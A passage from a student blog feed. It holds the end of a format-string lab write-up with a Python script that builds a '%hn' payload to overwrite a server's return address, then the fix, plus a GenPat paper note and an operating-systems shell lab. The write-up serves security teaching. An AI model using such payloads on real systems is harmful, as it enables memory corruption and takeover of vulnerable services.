class="hljs-string">&quot;x\n&quot;</span> + <span class="hljs-string">&quot;%75$hn\n&quot;</span> +<span class="hljs-string">&quot;%76$.32766lx\n&quot;</span> + <span class="hljs-string">&quot;%76$hn\n&quot;</span> +<span class="hljs-string">&quot;%77$.32767lx\n&quot;</span> + <span class="hljs-string">&quot;%77$hn\n&quot;</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>offset=<span class="hljs-number">320</span>-<span class="hljs-built_in">len</span>(fmt)<br><span class="hljs-built_in">print</span>(offset+<span class="hljs-number">1</span>) <span class="hljs-comment"># num1 - offset +1</span><br>content[offset:offset+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><span class="hljs-comment"># target地址0x0000555555558010，代替number查看修改的值，用来调试</span><br>number  =  ebp + <span class="hljs-number">0x8</span><br>content[offset+<span class="hljs-built_in">len</span>(fmt):offset+<span class="hljs-built_in">len</span>(fmt)+<span class="hljs-number">8</span>]  =  (number).to_bytes(<span class="hljs-number">8</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>number2 = number + <span class="hljs-number">2</span><br>content[offset+<span class="hljs-built_in">len</span>(fmt)+<span class="hljs-number">8</span>:offset+<span class="hljs-built_in">len</span>(fmt)+<span class="hljs-number">16</span>]  =  (number2).to_bytes(<span class="hljs-number">8</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>number3 = number2 + <span class="hljs-number">2</span><br>content[offset+<span class="hljs-built_in">len</span>(fmt)+<span class="hljs-number">16</span>:offset+<span class="hljs-built_in">len</span>(fmt)+<span class="hljs-number">24</span>]  =  (number3).to_bytes(<span class="hljs-number">8</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>number4 = number3 + <span class="hljs-number">2</span><br>content[offset+<span class="hljs-built_in">len</span>(fmt)+<span class="hljs-number">24</span>:offset+<span class="hljs-built_in">len</span>(fmt)+<span class="hljs-number">32</span>]  =  (number4).to_bytes(<span class="hljs-number">8</span>,byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-comment">############################################################</span><br><br><span class="hljs-comment"># Save the format string to file</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure><p><img src="/posts/35f73974/image-20211204181020935.png" alt="image-20211204181020935"></p><h1 id="task-6-fixing-the-problem"><a class="markdownIt-Anchor" href="#task-6-fixing-the-problem"></a> Task 6: Fixing the Problem</h1><p>还记得gcc编译器生成的警告消息吗？请解释一下它的意思。</p><p><img src="/posts/35f73974/image-20211204181237338-16386127667452.png" alt="image-20211204181237338"></p><p>警告的意思是：将一个非常量作为format string，且没有格式化参数。</p><p>请修复服务器程序中的漏洞，并重新编译。</p><p>要解决这个warning，要将<code>printf(msg)</code> 改成 <code>printf(&quot;%s&quot;, msg)</code></p><p>再次make后发现警告消失</p><p><img src="/posts/35f73974/image-20211204181357495.png" alt="image-20211204181357495"></p><p>尝试更改32位程序的target值，更改失败</p>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>软件安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件安全</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论文笔记：《Inferring program transformations from singular examples via big code》</title>
    <link href="/posts/15c2857c/"/>
    <url>/posts/15c2857c/</url>
    
    <content type="html"><![CDATA[<h1 id="第1章-论文研读"><a class="markdownIt-Anchor" href="#第1章-论文研读"></a> 第1章 论文研读</h1><h2 id="11-摘要"><a class="markdownIt-Anchor" href="#11-摘要"></a> <strong>1.1 摘要</strong></h2><p>从具体的程序更改推断程序转换有许多潜在的用途，例如应用系统程序编辑、重构和自动程序修复。现有的程序转换推断工作通常依赖于大量程序更改示例的统计信息。然而，在许多实际场景中，我们没有这么多程序更改示例集。</p><p>在本文中，我们解决了从一个例子推断程序转换的挑战。我们的核心观点是，“大代码”可以为将一个具体的更改泛化到一个程序的转换这一过程提供有效的指导，也就是说，出现在许多文件中的代码元素是通用的，不应该被抽象掉。我们首先提出了一个转换推理的框架，其中程序被表示为超图，以支持转换的细粒度泛化。然后，我们设计了一种转换推断方法，GenPat，它基于代码上下文和来自大型代码语料库的统计信息推断程序转换。</p><p>我们在系统编辑和程序修复两种不同的应用场景下对GenPat进行了评估。对系统编辑的评估表明，GenPat显著优于最先进的方法SYDIT，正确转换案例5.5倍于SYDIT。评价程序修复表明GenPat有潜力集成到先进的程序修复工具中。通过简单地应用从现有补丁推断出来的转换，GenPat成功地修复了Defects4J基准中的19个现实世界中的bug，其中4个bug从未被任何现有技术修复过。总的来说，评价结果表明，GenPat可以有效的进行转换推理，并可以用于许多不同的应用。</p><h2 id="12-genpat流程和方法概括"><a class="markdownIt-Anchor" href="#12-genpat流程和方法概括"></a> <strong>1.2 GenPat流程和方法概括</strong></h2><p><img src="/posts/15c2857c/image-20221102093916620.png" alt="image-20221102093916620"></p><h3 id="i-the-genpat-approach"><a class="markdownIt-Anchor" href="#i-the-genpat-approach"></a> <strong>I. THE GENPAT APPROACH</strong></h3><p>给定修改前后的两个代码段，基本方法如下：</p><p>分为两个阶段</p><p><strong>推断阶段</strong></p><p>(1) 从修改前的代码段中提取代码超图，</p><p>(2) 通过比较两个代码段提取修改序列，</p><p>(3) 通过从超图中选择元素和属性来推断转换，</p><p><strong>应用阶段</strong></p><p>(4) 匹配并应用给定的新代码段的转换。</p><h1 id="第二章-实验复现"><a class="markdownIt-Anchor" href="#第二章-实验复现"></a> <strong>第二章 实验复现</strong></h1><h2 id="21-环境搭建"><a class="markdownIt-Anchor" href="#21-环境搭建"></a> <strong>2.1 环境搭建</strong></h2><p>Ubuntu20.04(或者Ubuntu16.04)</p><h3 id="i-java环境搭建"><a class="markdownIt-Anchor" href="#i-java环境搭建"></a> <strong>I. java环境搭建</strong></h3><p>要求：jdk1.8</p><p>实验要求安装jdk1.8，否则会导致部分出现未知错误</p><p>Java环境配置具体参见了如下链接</p><p><a href="https://blog.csdn.net/weixin_46439193/article/details/104992522">https://blog.csdn.net/weixin_46439193/article/details/104992522</a></p><p><img src="/posts/15c2857c/image-20221102093937123.png" alt="image-20221102093937123"></p><p>最后的环境变量配置需要加到/etc/bash.bashrc，只是加到.bashrc会导致关闭终端后配置失效</p><p>关于java也可以直接用apt install</p><h3 id="ii-maven环境配置"><a class="markdownIt-Anchor" href="#ii-maven环境配置"></a> <strong>II. maven环境配置</strong></h3><p><img src="/posts/15c2857c/image-20221102093943748.png" alt="image-20221102093943748"></p><p>直接利用apt-get在命令行中安装</p><p>自行选择路径可参考如下链接</p><p><a href="https://www.cnblogs.com/fuzongle/p/12825048.html">https://www.cnblogs.com/fuzongle/p/12825048.html</a></p><h3 id="iii-defects4j数据集安装和配置"><a class="markdownIt-Anchor" href="#iii-defects4j数据集安装和配置"></a> <strong>III. Defects4J数据集安装和配置</strong></h3><p>结合博客链接和Defects4J官方github网站指导配置</p><p><a href="https://blog.csdn.net/weixin_46439193/article/details/104721218">https://blog.csdn.net/weixin_46439193/article/details/104721218</a></p><p>同样，更新环境变量到全局的配置文件。</p><p>sudo vi /etc/bash.bashrc</p><p>#文末插入下面的环境变量</p><p>export PATH=$PATH:/home/zino/defects4j/framework/bin</p><p>export DEFECTS4J_HOME=/zino/au/defects4j</p><p>#更新配置文件</p><p>source /etc/bash.bashrc</p><h3 id="iv-构建maven项目"><a class="markdownIt-Anchor" href="#iv-构建maven项目"></a> <strong>IV. 构建maven项目</strong></h3><p>首先从<a href>https://github.com/xgdsmileboy/GenPat</a> 上下载项目源码，然后直接在项目文件夹下打开终端输入命令mvn package</p><p>显示打包失败</p><p>修改命令为mvn clean package -Dmaven.test.skip=true，跳过单测，可以成功建包。</p><h2 id="22-实验测试"><a class="markdownIt-Anchor" href="#22-实验测试"></a> <strong>2.2 实验测试</strong></h2><h3 id="221-样例数据测试"><a class="markdownIt-Anchor" href="#221-样例数据测试"></a> <strong>2.2.1 样例数据测试</strong></h3><p>首先我们在replication文件夹里测试作者设定好的数据集SYDIT和C3</p><p>分析测试结果</p><p>Junit 1测试未发现在目标文件中未发现对应模式。</p><p><img src="/posts/15c2857c/image-20221102093952305.png" alt="image-20221102093952305"></p><p>观察下面的junit#5，我们可以发现其与步骤的对应关系</p><ol><li>从修改前的代码段中提取代码超图</li></ol><p>src_0.java为修改前的代码段，从其中提取出代码超图</p><ol><li>通过比较两个代码段提取修改序列</li></ol><p>通过比较src_0.java和tar_0.java来得到如下图所示的pattern对比，即修改模式</p><ol><li>通过从超图中选择元素和属性来推断转换</li></ol><p>然后在tar_1.java中提取超图，选择元素和属性来推断转换</p><ol><li>匹配并应用给定的新代码段的转换。</li></ol><p>匹配并应用，给出修改意见candidate，可以发现通过示例文件的模式成功发现了一个bug并给出修复意见</p><p><img src="/posts/15c2857c/image-20221102094001414.png" alt="image-20221102094001414"></p><p><img src="/posts/15c2857c/image-20221102094007777.png" alt="image-20221102094007777"></p><h3 id="222-genpat命令操作"><a class="markdownIt-Anchor" href="#222-genpat命令操作"></a> <strong>2.2.2 GenPat命令操作</strong></h3><h4 id="print"><a class="markdownIt-Anchor" href="#print"></a> <strong>print</strong></h4><p>打印出给定pattern文件的具体信息</p><p><img src="/posts/15c2857c/image-20221102094016100.png" alt="image-20221102094016100"></p><p>测试</p><p><img src="/posts/15c2857c/image-20221102094051067.png" alt="image-20221102094051067"></p><h4 id="filter"><a class="markdownIt-Anchor" href="#filter"></a> <strong>filter</strong></h4><p>通过给定参数过滤筛选模式文件</p><p><img src="/posts/15c2857c/image-20221102094058087.png" alt="image-20221102094058087"></p><p><img src="/posts/15c2857c/image-20221102094104097.png" alt="image-20221102094104097"></p><p>测试</p><p><img src="/posts/15c2857c/image-20221102094131869.png" alt="image-20221102094131869"></p><h4 id="repair"><a class="markdownIt-Anchor" href="#repair"></a> <strong>repair</strong></h4><p>尝试用给定的模式来修复一个bug文件或者defect4j数据集中的一个bug</p><p><img src="/posts/15c2857c/image-20221102094145672.png" alt="image-20221102094145672"></p><p>测试</p><p><img src="/posts/15c2857c/image-20221102094211732.png" alt="image-20221102094211732"></p><h4 id="cluster"><a class="markdownIt-Anchor" href="#cluster"></a> <strong>cluster</strong></h4><p>将相同的模式文件聚集在一起</p><p><img src="/posts/15c2857c/image-20221102094223656.png" alt="image-20221102094223656"></p><p>测试</p><p><img src="/posts/15c2857c/image-20221102094230121.png" alt="image-20221102094230121"></p><h1 id="参考文献"><a class="markdownIt-Anchor" href="#参考文献"></a> <strong>参考文献</strong></h1><p>[1] Jiang JJ, Ren LY, Xiong YF, Zhang LM. Inferring program transformations from singular examples via big code. In: Proc. of the 34th Int’l Conf. on Automated Software Engineering (ASE). IEEE, 2019. 255−266. [doi: 10.1109/ASE.2019.00033]</p>]]></content>
    
    
    <categories>
      
      <category>Paper Note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>论文笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统Lab2-shell初步和调试</title>
    <link href="/posts/da9b6b33/"/>
    <url>/posts/da9b6b33/</url>
    
    <content type="html"><![CDATA[<h1 id="操作系统第二次实验"><a class="markdownIt-Anchor" href="#操作系统第二次实验"></a> 操作系统第二次实验</h1><h2 id="实验4-shell初步"><a class="markdownIt-Anchor" href="#实验4-shell初步"></a> 实验4 shell初步</h2><h3 id="一-实验目的"><a class="markdownIt-Anchor" href="#一-实验目的"></a> 一、实验目的</h3><ul><li>熟悉shell的基本操作</li><li>使用LINUX中最常用的数据处理命令</li></ul><h3 id="二-实验要求"><a class="markdownIt-Anchor" href="#二-实验要求"></a> 二、实验要求</h3><ul><li>使用通配符来进行文件名的查找</li><li>重定向标准输入、标准输出、标准错误输出</li><li>使用管道操作，将一个进程的输出作为另一个进程的输入</li><li>使用群命令和命令行续行符</li><li>在指定的目录中，对满足条件的文件名进行递归查找</li><li>了解vi编辑器的基本用法</li><li>在文本文件中，查找符合指定模式的文本行</li><li>将文本文件中的各行，按顺序排列</li><li>显示一个文本文件的前几行或者后几行</li></ul><h3 id="三-实验预备知识"><a class="markdownIt-Anchor" href="#三-实验预备知识"></a> 三、实验预备知识</h3><h4 id="1-shell简介"><a class="markdownIt-Anchor" href="#1-shell简介"></a> 1. shell简介</h4><p>shell是一个命令解释程序， 它提供了操作系统与用户之间的主要界面，控制用户与内核之间的交互作用。</p><p>除了解释用户从键盘上键入的命令外，shell也可以解释存储在文件中的命令。在Linux中，存储命令的文本文件称为shell脚本，可以具有任意的扩展名。shell实际上是一种编程语言，shell编程广泛地用于获取经常执行的命令和过程。</p><h4 id="2-shell特殊变量"><a class="markdownIt-Anchor" href="#2-shell特殊变量"></a> 2. shell特殊变量</h4><p>$?——上一条命令的执行情况<br>$#——命令行参数的个数<br>$*——所有命令行参数的内容<br>$@——所有命令行参数的内容<br>​$n——命令行的第n个参数</p>——当前shell程序的pid\$!——最近一个在后台运行的命令的pid\$-——当前选项标志\$_——上一条命令的最后一个参数#### 3. shell脚本- 建立shell脚本  可以用来建立文本文件的方法都可以用来建立shell脚本。例如，可以用vi编辑器或是emacs编辑器来建立一个shell脚本，也可以通过重定向标准输入和输出在命令行上直接建立shell脚本文件。  如下使用cat命令建立shell脚本：  cat > print_user  echo User name:\$LOGNAME  echo Home directory: ​\$HOMEecho Current shell PID: <p>&lt;Ctrl+D&gt;</p><ul><li>执行shell脚本<br>(1)用子shell执行shell脚本文件要用子shell执行的脚本文件print_user，可以键入如下命令：<br>$sh print_user<br>(2)用“.”命令执行shell脚本文件<br>“.”命令的一般形式为：<br>​$ . shell脚本文件名<br>(3)用exec命令执行shell脚本文件<br>该命令的一般形式为：<br>​$ exec .／shell脚本文件名</li></ul><p><img src="/posts/da9b6b33/image-20211030085349663.png" alt="image-20211030085349663"></p><h3 id="四-实验内容"><a class="markdownIt-Anchor" href="#四-实验内容"></a> 四、实验内容</h3><h4 id="1-通配符"><a class="markdownIt-Anchor" href="#1-通配符"></a> 1. 通配符</h4><ul><li>通配符用于模式匹配，如文件名匹配、路经名搜索、字符串查找等。常用的通配符有*、?和括在方括号[ ]中的字符序列。用户可以在作为命令参数的文件名中包</li><li>含这些通配符，构成一个所谓的“模式串”，在执行过程中进行模式匹配。</li><li>*代表任何字符串（长度可以不等，可以为空字符串）。<br>例如：“a*”匹配以a打头的任意字符串。</li><li>？代表任何单个字符。</li><li>[ ]代表指定的一个字符范围，只要文件名中[ ]位置处的字符在[ ]中指定的范围之内，那么这个文件名就与这个模式串匹配。</li></ul><h4 id="2-重定向"><a class="markdownIt-Anchor" href="#2-重定向"></a> 2. 重定向</h4><p>重定向就是将标准输入、标准输出甚至标准报错重定向到一个文件。也就是说，可以让命令从某个文件中读取参数和数据，命令的输出结果也可以送至某个文件中而不是在终端上显示出来。实现重定向的最简单的方法是使用改向操作符。改向操作符可以将标准输入、标准输出和标准报错改向到某个文件。</p><blockquote><p>例：将显示结果重定向到file文件当中。</p><p>$ls –l &gt; file</p></blockquote><p><img src="/posts/da9b6b33/image-20211030094311466.png" alt="image-20211030094311466"></p><p>另一 种实现重定向的方法是使用管道(|)，它将一条命令的输出发送到另一条命令的输入。</p><blockquote><p>例：将文件junk作为信件的内容，给自己发个mail</p><p>$cat junk|mail 用户名</p></blockquote><h4 id="3-管道及tee"><a class="markdownIt-Anchor" href="#3-管道及tee"></a> 3. 管道及tee</h4><p>管道操作符将一条命令的输出定向到另一条命令的输入，而不是定向到终端或文件。</p><blockquote><p>例：使用一个管道操作来计算当前目录中的文件数目</p><p>$ls | wc -w</p></blockquote><p><img src="/posts/da9b6b33/image-20211030100427858.png" alt="image-20211030100427858"></p><p>tee命令作用可以用字母T来形象地表示。它把输出的一个副本输送到标准输出，另一个副本拷贝到相应的文件中。</p><blockquote><p>例：将上述命令的结果同时输出到文件junk当中<br>$ls | wc –w | tee junk</p></blockquote><p><img src="/posts/da9b6b33/image-20211030100611018.png" alt="image-20211030100611018"></p><h4 id="4-群命令及续行符"><a class="markdownIt-Anchor" href="#4-群命令及续行符"></a> 4. 群命令及续行符</h4><p>如果希望在成功地执行一个命令之后再执行另一个命令，或者在一个命令失败后再执行另一个命令，&amp;&amp;和||可以完成这样的功能。相应的命令可以是系统命令或shell脚本。</p><p>shell还提供了在当前shell或子shell中执行一组命令的方法，即使用（）和{ }。</p><blockquote><p>例：调用如下命令：显示日期；显示已经登录到系统中的所有用户名；显示当前目录的名称；显示当前目录中的所有文件名。<br>$ date; who; pwd; ls -a<br>这组命令将按顺序执行，不管前一命令是否出错，后一命令继续执行</p></blockquote><p><img src="/posts/da9b6b33/image-20211030100659567.png" alt="image-20211030100659567"></p><blockquote><p>例：将file1中的内容拷贝到file2当中，如果拷贝成功 ，则回应一个消息。<br>$cp file1 file2 &amp;&amp; echo “cp is successful!”</p></blockquote><p><img src="/posts/da9b6b33/image-20211030100841129.png" alt="image-20211030100841129"></p><blockquote><p>例：使用||，实现若拷贝操作不成功，则返回一个消息。<br>$cp file3 file1 || echo “cp is failed!”</p></blockquote><p><img src="/posts/da9b6b33/image-20211030101131852.png" alt="image-20211030101131852"></p><blockquote><p>例：在上面的例子当中，若拷贝失败，则回应一个消息，并给自己发送一封邮件，最后退出。<br>$cp file3 file1 || (echo“cp is failed!”；mail chen ;  exit)</p></blockquote><p><img src="/posts/da9b6b33/image-20211030103318759.png" alt="image-20211030103318759"></p><h4 id="5-find命令"><a class="markdownIt-Anchor" href="#5-find命令"></a> 5. find命令</h4><p>find是一个非常有效的工具，它可以遍历当前目录甚至于整个文件系统来查找某些文件或目录。</p><p>find命令的一般形式为：find pathname -options [-print – exec –ok]</p><ul><li>pathname：find命令所查找的目录路径。</li><li>-print：find命令将匹配的文件输出到标准输出。</li><li>-exec：find命令对匹配的文件执行该参数所给出的shell命令。</li><li>-ok 和- exec的作用相同，只不过在执行每一个命<br>令之前，都会给出提示，让用户来确定是否执行</li></ul><blockquote><p>例：在你的用户主目录中查找所有以字母s开头的件名。而后，对它们自动执行ls –l命令<br>$ find ~ -name “s*” -type f -exec ls -l {} \；</p></blockquote><p><img src="/posts/da9b6b33/image-20211030104212448.png" alt="image-20211030104212448"></p><blockquote><p>例：重复上一步的查找。不同的是，对查找的文件名执行ls –l命令时，采用与用户进行交互的方式。<br>$ find ~ -name “s*” -type f -ok ls -l {} \；</p></blockquote><p><img src="/posts/da9b6b33/image-20211030104507621.png" alt="image-20211030104507621"></p><blockquote><p>例：在/usr目录中，查找所有用户zino拥有的文件。而后，计算出这些文件的个数。并将所有的错误信息重定向到一个名为errfile的文件中。<br>$ find /usr/ -user zino -print 2&gt; errfile | wc -l</p></blockquote><p><img src="/posts/da9b6b33/image-20211030104831707.png" alt="image-20211030104831707"></p><h4 id="6-vi编辑器"><a class="markdownIt-Anchor" href="#6-vi编辑器"></a> 6. vi编辑器</h4><p>vi编辑器是UNIX的强有力的文本文件编辑工具，利用它可以建立、修改文本文件。</p><h5 id="1-vi编辑器的进入"><a class="markdownIt-Anchor" href="#1-vi编辑器的进入"></a> (1) vi编辑器的进入：</h5><p>vi 文件名(自动进入命令方式)。</p><img src="/posts/da9b6b33/image-20211030105126128.png" alt="image-20211030105126128" style="zoom: 80%;"><h5 id="2-vi编辑器的退出"><a class="markdownIt-Anchor" href="#2-vi编辑器的退出"></a> (2) vi编辑器的退出：</h5><p>在指令模式下键入:q，:q!，:wq或:x(注意:号), 就会退出vi。其中:wq和:x是存盘退出，而:q是直接退出。</p><img src="/posts/da9b6b33/image-20211030105205014.png" alt="image-20211030105205014" style="zoom:80%;"><h5 id="3-基本编辑指令"><a class="markdownIt-Anchor" href="#3-基本编辑指令"></a> (3) 基本编辑指令</h5><ul><li><p>新增 (append)</p><ul><li>a ：从光标所在位置后面开始新增资料。</li><li>A： 从光标所在列最后面的地方开始新增加资料</li></ul></li><li><p>插入 (insert)</p><ul><li>i： 从光标所在位置前面开始插入资料。</li><li>I ：从光标所在列的第一个非空白字元前面开始插入资料。</li></ul></li><li><p>开始 (open)</p><ul><li>o ：在光标所在列下新增一列并进入输入模式。</li><li>O: 在光标所在列上方新增一列并进入输入模式。</li><li>x： 删除光标所在字符。</li><li>dd ：删除光标所在的列。</li><li>r ：修改光标所在字元，r 后接著要修正的字符。</li><li>R：进入取替换状态，新增文字会覆盖原先文字，直到按[ESC] 回到指令模式下为止。</li><li>s： 删除光标所在字元，并进入输入模式。</li><li>S： 删除光标所在的列，并进入输入模式。</li></ul></li></ul><h4 id="7-grep命令"><a class="markdownIt-Anchor" href="#7-grep命令"></a> 7. grep命令</h4><p>grep命令从指定的输入文件中查找与指定的正则表达式相匹配的行。默认情况下，grep命令将输出所找到<br>的匹配行。</p><p>grep命令的一般形式如下：grep [options] [regular-expression] [file1, file2, …]</p><p>其中，options指定grep命令的各种选项，regularexpression指定用来查找的正则表达式，file1，file2，…等参数是要查找的输入文件名。在最简单的情况下，用来查找的正则表达式可以是简单的字符串。</p><blockquote><p>例：在文件/etc/passwd中，找出所有以nm开头的用户名所在的文本行。<br>$ grep ‘^nm’ /etc/passwd</p></blockquote><p><img src="/posts/da9b6b33/image-20211030105817077.png" alt="image-20211030105817077"></p><blockquote><p>例：在文件/etc/passwd中，找出所有以nologin结尾的文本行。<br>$grep ‘nologin$’ /etc/passwd</p></blockquote><p><img src="/posts/da9b6b33/image-20211030105940431.png" alt="image-20211030105940431"></p><blockquote><p>例：在文件/etc/passwd中，找出所有包含root的文体行，并将输出重定向到passwd.out文件当中<br>$grep ‘root’ /etc/passwd &gt; passwd</p></blockquote><p><img src="/posts/da9b6b33/image-20211030110907325.png" alt="image-20211030110907325"></p><h4 id="8-sort命令"><a class="markdownIt-Anchor" href="#8-sort命令"></a> 8. sort命令</h4><p>sort命令的功能是对文件中的各行进行排序，并结果显示在标准输出上。如不指定输入文件或使用“-”，则表示排序内容来自标准输入。</p><p>sort 命令的一般形式为：sort [options] file</p><blockquote><p>例：以字母顺序显示/etc/passwd文件的内容。然后，以逆序显示其内容。<br>$ sort /etc/passwd<br>$ sort -r /etc/passwd</p></blockquote><p><img src="/posts/da9b6b33/image-20211030111144737.png" alt="image-20211030111144737"></p><p><img src="/posts/da9b6b33/image-20211030111139595.png" alt="image-20211030111139595"></p><h4 id="9-head命令与tail命令"><a class="markdownIt-Anchor" href="#9-head命令与tail命令"></a> 9. head命令与tail命令</h4><blockquote><p>例： 显示/etc/passwd文件的前10行的内容<br>$ head -10 /etc/passwd</p></blockquote><p><img src="/posts/da9b6b33/image-20211030111210783.png" alt="image-20211030111210783"></p><blockquote><p>例：显示/etc/passwd文件的前5行的内容<br>$ head -5 /etc/passwd</p></blockquote><p><img src="/posts/da9b6b33/image-20211030111238931.png" alt="image-20211030111238931"></p><blockquote><p>例：显示/etc/passwd文件的后10行的内容<br>$ tail -10 /etc/passwd</p></blockquote><p><img src="/posts/da9b6b33/image-20211030111258622.png" alt="image-20211030111258622"></p><h2 id="实验5-控制进程"><a class="markdownIt-Anchor" href="#实验5-控制进程"></a> 实验5 控制进程</h2><h3 id="一-实验目的-2"><a class="markdownIt-Anchor" href="#一-实验目的-2"></a> 一、实验目的</h3><ul><li>熟悉进程的操作与控制</li><li>掌握使用linux命令管理和操作进程的方法</li></ul><h3 id="二-实验要求-2"><a class="markdownIt-Anchor" href="#二-实验要求-2"></a> 二、实验要求</h3><ul><li>使用ps与jobs命令监视进程</li><li>使用kill与jobs命令控制进程</li><li>显示当前进程的ID</li></ul><h3 id="三-实验预备知识-2"><a class="markdownIt-Anchor" href="#三-实验预备知识-2"></a> 三、实验预备知识</h3><h4 id="1-多用户"><a class="markdownIt-Anchor" href="#1-多用户"></a> 1、多用户</h4><p>LINUX操作系统的一个优点就是，它完全是作为一个多用户的系统设计的，LINUX操作系统提供了分时操作功能。多用户功能，不仅仅在于同时为多个用户提供计算支持，它还应包括为系统中的各个用户的数据提供保护方案。在多用户的支持下，用户们可以在同一台计算机上同时进行不同的操作，还可以同时协调完成同一任务。</p><h4 id="2-多任务"><a class="markdownIt-Anchor" href="#2-多任务"></a> 2、多任务</h4><p>多任务是指在同一时间内可以同时启动多个程序，各个程序同时运行，协调地使用系统资源。多任务的实现需要由操作系统来支持，不同程序的运行需要由操作系统来调度。从多任务实现的角度来说，多任务分为两类：协作式多任务和抢占式多任务。</p><h4 id="3-进程"><a class="markdownIt-Anchor" href="#3-进程"></a> 3、进程</h4><p>进程是操作系统中可以独立调度的单元，每个执行的任务都成为进程，可以看作是程序的一次执行</p><p>程序和进程的概念差别在于：程序是一些数据和指令的集合，它通常是以文件的形式存在，并且一旦程序生成后，除非删除它，否则它将一直存在。而进程是一个动态的概念，它是程序的一次执行。从系统的角度来说，进程是操作系统用于调度的基本单位，进程是可以独立拥有系统资源的单位。它具有几个特性：并行性、异步性、互斥性。</p><h4 id="4-作业"><a class="markdownIt-Anchor" href="#4-作业"></a> 4、作业</h4><p>作业（job）这个概念最早出现在批处理系统中。作业是用户向计算机系统提交一项工作的基本单位，是用户在一次事务处理或计算过程中要求计算机所做工作的总和。</p><h4 id="5-进程和作业"><a class="markdownIt-Anchor" href="#5-进程和作业"></a> 5、进程和作业</h4><p>作业是用户向计算机系统提交一项工作的基本单位，是用户在一次事务处理或计算过程中要求计算机所做工作的总和，是描述用户向系统提交工作任务的实体单位 。进程是一个具有一定独立功能的程序关于某个数据集合的一次运行活动，是操作系统分配资源和进行调度的基本单位，是系统完成工作任务时程序执行的实体单位。</p><h4 id="6-前台和后台"><a class="markdownIt-Anchor" href="#6-前台和后台"></a> 6、前台和后台</h4><p>前台进程是指正在对它进行交互操作的进程——它从键盘接收输入，并将输出送往屏幕（当然，用户可以对输入输出进行重新定向）。有一些进程需要很长时间才能结束，并且运行起来很单调乏味。编译程序就是一个这样的进程。在后台运行它们就可以了。</p><h4 id="7-进程状态及转换"><a class="markdownIt-Anchor" href="#7-进程状态及转换"></a> 7、进程状态及转换</h4><h5 id="1-进程的基本状态"><a class="markdownIt-Anchor" href="#1-进程的基本状态"></a> ⑴ 进程的基本状态</h5><p><img src="/posts/da9b6b33/image-20211030112916303.png" alt="image-20211030112916303"></p><h5 id="2-linux系统进程状态"><a class="markdownIt-Anchor" href="#2-linux系统进程状态"></a> ⑵ linux系统进程状态</h5><p><img src="/posts/da9b6b33/image-20211030112940312.png" alt="image-20211030112940312"></p><h4 id="8-父子进程"><a class="markdownIt-Anchor" href="#8-父子进程"></a> 8、父子进程</h4><p>进程在其执行过程中，能通过系统调用创建多个新进程。创建进程成为父进程，而新进程称为该进程的子进程。</p><h4 id="9-命令简介"><a class="markdownIt-Anchor" href="#9-命令简介"></a> 9、命令简介</h4><h5 id="1-psprocess-status"><a class="markdownIt-Anchor" href="#1-psprocess-status"></a> ⑴ Ps（Process Status）</h5><p>查看目前的系统中有哪些进程正在执行，以及它们的执行情况。<br>语法：ps [任选参数]<br>常用参数:<br>ps或ps -x 查看系统中，属于自己的进程。<br>ps -au 查看系统中，所有用户的进程。<br>ps -aux 查看系统中，包含系统内部的及所有用户的进程。</p><h5 id="2-top"><a class="markdownIt-Anchor" href="#2-top"></a> ⑵ top</h5><p>动态显示进程，实时监测进程状态。<br>常用操作：<br>q：退出top命令。<br>m：切换显示内存信息。<br>t：切换显示进程和CPU状态信息。<br>c：切换显示命令名称和完整命令行。<br>W：将当前设置写入~/.toprc文件中。这是写top配置文件的推荐方法。</p><h5 id="3-kill"><a class="markdownIt-Anchor" href="#3-kill"></a> ⑶ kill</h5><p>Kill命令可以传送的信号有很多种，但以SIGTERM（15）或SIGKILL（9）居多，它们都是用来结束进程执行的。<br>语法：kill [-9] PID<br>PID：利用ps 命令所查出的进程号。<br>例如:<br>kill 456或kill -9 456 终止进程号为456 的进程。<br>语法：kill %n<br>n：利用jobs命令查看出的后台作业号<br>结束或终止后台中的进程</p><h5 id="4"><a class="markdownIt-Anchor" href="#4"></a> ⑷ &amp;</h5><p>在后台执行进程的方式<br>语法：命令&amp;</p><h5 id="5-jobs"><a class="markdownIt-Anchor" href="#5-jobs"></a> ⑸ jobs</h5><p>显示当前会话的作业状态。<br>语法<br>jobs [ -l | -n | -p ] [ JobID … ]</p><h5 id="6-外壳变量"><a class="markdownIt-Anchor" href="#6-外壳变量"></a> ⑹ 外壳变量</h5><p>查看外壳变量的设定值<br>语法：set 查看所有外壳变量的设定值。<br>语法：echo $变量名显示指定的外壳变量的设定值。</p><p>设定外壳变量<br>语法：set var = value<br>删除外壳变量<br>语法：unset var</p><h5 id="7-查看系统中的用户"><a class="markdownIt-Anchor" href="#7-查看系统中的用户"></a> ⑺ 查看系统中的用户</h5><p>Who命令主要用于查看当前登录的用户情况。<br>语法： who [-imqsuwHT][- -count][- -heading][- -help][- -<br>message][- -mesg][- -version][- -writable][file][am i]<br>⑻查看当前系统上所有工作站的用户<br>语法: rusers<br>按Ctrl+D&gt; 结束</p><h3 id="四-实验内容-2"><a class="markdownIt-Anchor" href="#四-实验内容-2"></a> 四、实验内容</h3><h4 id="1-进程的结构"><a class="markdownIt-Anchor" href="#1-进程的结构"></a> 1. 进程的结构</h4><p><strong>(1) 登录进程系统，显示当前的进程ID</strong></p><p><img src="/posts/da9b6b33/image-20211030125913051.png" alt="image-20211030125913051"></p><p><strong>(2) 创建一个子shell</strong></p><p><img src="/posts/da9b6b33/image-20211030130010739.png" alt="image-20211030130010739"></p><p><strong>(3) 执行<code>ls -R / &gt; outfile2 2&gt;&gt; errfile &amp;</code>命令后，立即再运行一个命令，列出你的所有正在运行的进程。</strong></p><p><img 